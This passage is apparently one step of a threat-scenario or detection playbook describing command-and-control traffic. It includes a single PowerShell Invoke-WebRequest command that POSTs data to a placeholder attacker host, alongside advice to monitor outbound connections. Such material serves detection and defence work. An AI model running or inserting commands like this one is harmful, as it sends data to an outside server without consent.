
   7. **Command and Control Communication**
      - Application: PowerShell
      - User Action: The payload initiates a connection to the attacker's command and control server.
      - Key Artifacts: PowerShell command: `Invoke-WebRequest -Uri http://malicious.com/c2 -Method POST -Body "data"`.
      - Detection: Monitor for outbound connections to known malicious IP addresses or domains.
   